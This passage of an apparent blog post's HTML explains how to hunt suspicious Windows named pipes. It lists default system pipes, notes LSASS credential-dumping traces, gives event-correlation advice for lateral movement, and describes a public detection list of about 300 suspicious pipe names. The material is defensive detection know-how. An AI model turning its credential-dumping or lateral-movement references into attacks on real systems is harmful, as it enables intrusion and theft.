https://miro.medium.com/v2/resize:fit:1100/1*9aJbXOBPd-hrxX2UKbHrdQ.png 1100w, https://miro.medium.com/v2/resize:fit:3668/1*9aJbXOBPd-hrxX2UKbHrdQ.png 3668w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1834px"><img alt="" class="bi gl ou c" width="1834" height="254" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1834/1*9aJbXOBPd-hrxX2UKbHrdQ.png"></picture><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">EventID 1 showing the execution of pipe_client.exe without admin rights</figcaption></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="6544" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">At this point, you have gathered all the necessary details: the machine(s), the process and parent process information, the user who created the pipe, the user who connected to the pipe, the hash of the executables, relevant Event IDs generated by each application (depending on the service provided by each application - not limited to sysmon logs), and the pipe name itself.</p><p id="9d7b" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl sv" data-selectable-paragraph=""><span class="m sw sx sy bp sz ta tb tc td fr">W</span>hen analyzing named pipes, the initial focus should be on the pipe name, as it is defined by the developer. A unique pipe name can be a significant indicator for identifying specific applications or malware, aiding in threat intelligence and forensic investigations. Therefore, determining the uniqueness of the pipe name is a critical first step. This can help in correlating the<strong class="ox jb"> pipe usage with known protocols, tools or threat actor techniques and facilitate a more targeted and effective analysis</strong>.</p><p id="f332" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Here are some known named pipe associated with various protocols and services in Windows:</p><p id="f249" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">RPC Protocol</strong>:</p><ul class=""><li id="7358" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\epmapper</code></li><li id="d2cc" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\lsass</code></li><li id="a82a" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\samr</code></li><li id="449f" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\initshut</code></li><li id="c45d" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\ntsvcs</code></li><li id="2eb2" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\scerpc</code></li></ul><p id="5620" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">SQL Server</strong>:</p><ul class=""><li id="1587" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\sql\query</code></li><li id="1d37" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\MSSQL$&lt;instance_name&gt;\sql\query</code></li></ul><p id="aaf4" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Netlogon Service</strong>:</p><ul class=""><li id="1a92" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\netlogon</code></li></ul><p id="624c" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Print Spooler Service</strong>:</p><ul class=""><li id="c66b" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\spoolss</code></li></ul><p id="10a6" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Task Scheduler</strong>:</p><ul class=""><li id="3ae3" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\atsvc</code></li></ul><p id="18dd" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">RPC over SMB</strong>:</p><ul class=""><li id="48df" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\netdfs</code></li></ul><p id="599c" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Windows Event Log</strong>:</p><ul class=""><li id="efd6" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\eventlog</code></li></ul><p id="161a" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Remote Desktop </strong>:</p><ul class=""><li id="d6be" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\termsrv</code></li><li id="60ba" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\TSVCPIPE-*</code></li></ul><p id="d166" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Service Control Manager Remote Protocol:</strong></p><ul class=""><li id="630b" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\svcctl</code> (also used by many Lateral movement tool)</li></ul><p id="096f" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">WebDAV service:</strong></p><ul class=""><li id="a0d8" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\DAV RPC SERVICE</code></li></ul><p id="9b2d" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">LSASS</strong>:</p><ul class=""><li id="cfb6" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph="">\\.\pipe\lsass (When dumping LSASS for credential access, you may observe a ‘pipe connect’ to <code class="de qs qt qu qv b">\\.\pipe\lsass</code> initiated by the responsible process. For instance, <code class="de qs qt qu qv b">C:\Windows\System32\Taskmgr.exe</code> or procdump may establish a connection to <code class="de qs qt qu qv b">\\.\pipe\lsass</code></li></ul><p id="1a13" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">SMB Protocol (Hunt for Lateral Movement)</strong>:</p><ul class=""><li id="805e" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\srvsvc</code></li><li id="dc1d" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\wkssvc</code></li><li id="dcf7" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">\\.\pipe\browser</code></li></ul><blockquote class="te tf tg"><p id="f2f1" class="ov ow sl ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Just a quick note for lateral movement pivot investigations: When investigating lateral movement with named pipes, pivot on the PID with Sysmon Event ID 3 for network access. Observe Security <a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/wineventlogs/EventIDs/Security-5145.md" rel="noopener ugc nofollow" target="_blank">EventID 5140 or 5145</a> on the target machine for network share access. Correlate with connection Event IDs 4624, 4625, and 4648 for logon activities. Also, correlate with Sysmon Event ID 1 or Security Event ID 4688 for process execution context, and System Event IDs 7045, 7036, or Security Event ID 4697 for service installations by <a class="ah qr" href="https://medium.com/detect-fyi/detecting-psexec-and-similar-tools-c812bf3dca6c" rel="noopener"><strong class="ox jb">PSEXEC-like tools</strong></a>. For RDP connections, specifically check Event ID 4624 for Logon Type 3 or 10 (both could be generated depending on the SMB configuration). You can also confirm RDP connections in the Microsoft-Windows-TerminalServices-LocalSessionManager/Operational and Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational logs.</p></blockquote><p id="5a62" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">I won’t list every known named pipe here, but a quick Google search will often reveal their meanings, they are widely used and well-documented.</p></div></div></div><div class="ac ci rz sa sb sc" role="separator"><span class="sd by bn go se sf"></span><span class="sd by bn go se sf"></span><span class="sd by bn go se"></span></div><div class="ib iu iv iw ix"><div class="ac ci"><div class="cp bi ih ii ij ik"><h2 id="de20" class="pq pr ja bg ps pt sg pv gy pw sh py ha pz si qb qc qd sj qf qg qh sk qj qk ql bl" data-selectable-paragraph="">Suspicious Named pipe</h2><p id="b7e1" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl sv" data-selectable-paragraph=""><span class="m sw sx sy bp sz ta tb tc td fr">I’</span>ve dedicated a significant amount of time to analyzing tools locally and gathered unique named pipes from various tools, threat intelligence reports, sandboxes, and multiple sources. This effort has resulted in a collection of nearly <strong class="ox jb">300 suspicious named pipes</strong> (as of 2024/07/21).<br>Each named pipe is categorized for a detailed detection.</p><div class="th gn ti tj ac r cv"><div class="tk tl tm tn to m fm"><h2 class="tp b tq tr ts tt tu">Get mthcht’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="ty tz ua ub uc ud ac"><span class="bg b bh ab bl"><div class="ue ac cv"><div class="ac ue fj fi bq uf ug de nc uh ui uj uk ul um un"><input class="uo al aj an up uq gd mq bm ur bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l us cb"><div class="tv tw tx"><button class="bg b bh ab ut uu uv uw ux uy uz fc fd va vb vc fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab ut uu uv uw ux uy uz fc fd va vb vc fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="vd m"><div id="g-recaptcha"></div></div></div><p id="8095" class="pw-post-body-paragraph ov ow ja ox b oy pa pb pc pe pf hb ph pi he pk pl hh pn po tj pp ib bl" data-selectable-paragraph=""><em class="sl">I know that many lateral movement tools are using legitimate default pipe names used by Windows services. I am not adding all of them to my list. Instead, a dedicated detection rule that correlates multiple events from different log sources, along with some default named pipes, is preferable for identifying suspicious activity involving default pipes. I also didn’t include suspicious Linux named pipes in the list because they are essentially files and are detected with command line and file path patterns with auditd as mentionned before.</em></p><p id="3be9" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">You can access my detection list here <a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv" rel="noopener ugc nofollow" target="_blank">https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv</a></p><p id="f4ff" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Here’s a sample of what the list looks like:</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 1100w, https://miro.medium.com/v2/resize:fit:3406/format:webp/1*Z985ERhTRVqZA2Coi9R7JA.png 3406w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1703px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Z985ERhTRVqZA2Coi9R7JA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Z985ERhTRVqZA2Coi9R7JA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Z985ERhTRVqZA2Coi9R7JA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Z985ERhTRVqZA2Coi9R7JA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Z985ERhTRVqZA2Coi9R7JA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Z985ERhTRVqZA2Coi9R7JA.png 1100w, https://miro.medium.com/v2/resize:fit:3406/1*Z985ERhTRVqZA2Coi9R7JA.png 3406w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1703px"><img alt="" class="bi gl ou c" width="1703" height="928" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1703/1*Z985ERhTRVqZA2Coi9R7JA.png"></picture><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv" rel="noopener ugc nofollow" target="_blank">https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv</a></figcaption></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><h3 id="09f9" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Description of the List Headers:</h3><p id="6dda" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">pipe_name</strong>: The specific name of the pipe to detect or a pattern used for identifying the named pipe.</p><p id="a94f" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_description</strong>: A brief description of the associated tool.<br><strong class="ox jb">Metadata_tool</strong>: The name of the tool associated with the named pipe detection.</p><p id="2d0f" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_category</strong>: The category of the tool to help select a specific tool category in our hunt. Categories include: <strong class="ox jb">C2, Collection, Compliance, Credential Access, Data Exfiltration, Defense Evasion, Discovery, Exploitation, Lateral Movement, Malware, Persistence, Privilege Escalation, Ransomware, Reverse Engineering, RMM, VPN</strong>…</p><p id="17d6" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_link</strong>: The link to the tool or the article where the named pipe was found. For tools analyzed personally, a link to the tool or my repository is provided.</p><p id="c407" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_priority</strong>: The urgency level assigned to the detected tool.</p><ul class=""><li id="9555" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">info</strong>: Not urgent, likely a legitimate tool or for compliance detection, used for threat hunting and correlation only.</li><li id="f387" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">low </strong>or <strong class="ox jb">medium</strong>: Low urgency, probably associated with legitimate tools that could be abused by threat actors (greyware_tool), reserved for threat hunting sessions.</li><li id="80db" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">high</strong>: Needs quick investigation as the tool observed could have a significant impact but may also be attributed to legitimate tools that could be abused by threat actors.</li><li id="d0ca" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">critical</strong>: Top priority, the tool detected could have significant impact if not quickly remediated.</li></ul><p id="c197" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_fp_risk</strong>: The potential for false positives for the detection pattern (Pipe_name).</p><ul class=""><li id="9779" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">N/A</strong>: No known false positives for now (or not necessary to be tested).</li><li id="19b6" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">none</strong>: Very high chance of not generating any false positives and not observed so far.</li><li id="06b5" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">low</strong>: Low chance of generating a false positive detection.</li><li id="bee1" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">medium</strong>: Will probably generate false positives as the pattern is too generic or too short and could match other tools.</li><li id="c3b7" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">high</strong>: Very likely to produce false positives, very verbose detection (reserved for threat hunting sessions).</li></ul><p id="cc61" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_severity</strong>: The severity assigned to the detection, taking into account the priority and false positive risk.</p><ul class=""><li id="7dc1" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">info</strong>: Legitimate tools, only for correlation or compliance for some tools.</li><li id="ef33" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">low</strong>: Low severity detection (reserved for threat hunting sessions).</li><li id="5575" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">medium</strong>: Medium severity detection.</li><li id="01a0" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">high</strong>: High severity detection, each requires investigation (could be in threat hunting sessions or detection rules).</li><li id="6d40" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">critical</strong>: Critical severity, the tool could be very dangerous and a highly relevant indicator, requiring immediate investigation (could be in threat hunting sessions or detection rules).</li></ul><p id="c5b2" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_tool_type</strong>:</p><ul class=""><li id="853e" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">offensive_tool</strong>: This is an offensive tool, not used legitimately.</li><li id="767c" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">greyware_tool</strong>: This is a legitimate tool that is abused by threat actors.</li></ul><p id="3786" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_usage:</strong></p><ul class=""><li id="ebb5" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Hunting</strong>: Indicates the detection pattern is best suited for threat hunting sessions. It is designed to identify potential threats through proactive investigation rather than generating immediate alerts.</li><li id="c503" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Detection Rule</strong>: Indicate that the detection pattern is a reliable indicator of malicious activity. It can be implemented in detection rules to generate relevant alerts, ensuring timely and accurate threat response.</li></ul><p id="1bd3" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_comment</strong>: Additional comments about the detection.</p><p id="1955" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Metadata_reference</strong>: Link to the tool or the source where the detection is documented.</p><p id="cfba" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Many lateral movement tools use legitimate default pipe names employed by Windows services. I am not adding all of them to my list. Instead, a dedicated detection method that correlates multiple events from different log sources, along with specific named pipes, is preferable for identifying suspicious activity involving these pipes.</p><h2 id="39f5" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">Threat Intelligence</h2><p id="ec76" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Named pipes are often overlooked in IOC gathering within public reports and sandboxes. If analyzing a sample directly is not possible, pay close attention to the “Files Opened” artifacts in public sandboxes (if available) !</p><p id="6ec3" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">VirusTotal leverages Sysinternals tools within the “Behavior” tab to log named pipe activities</p><figure class="qx qy qz ra rb op oh oi paragraph-image"><div class="oh oi ve"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 1100w, https://miro.medium.com/v2/resize:fit:738/format:webp/1*DXi0bbvC4odX5jm45G1g0w.png 738w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 369px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*DXi0bbvC4odX5jm45G1g0w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*DXi0bbvC4odX5jm45G1g0w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*DXi0bbvC4odX5jm45G1g0w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*DXi0bbvC4odX5jm45G1g0w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*DXi0bbvC4odX5jm45G1g0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*DXi0bbvC4odX5jm45G1g0w.png 1100w, https://miro.medium.com/v2/resize:fit:738/1*DXi0bbvC4odX5jm45G1g0w.png 738w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 369px"><img alt="" class="bi gl ou c" width="369" height="181" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:369/1*DXi0bbvC4odX5jm45G1g0w.png"></picture></div></figure><p id="318e" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb 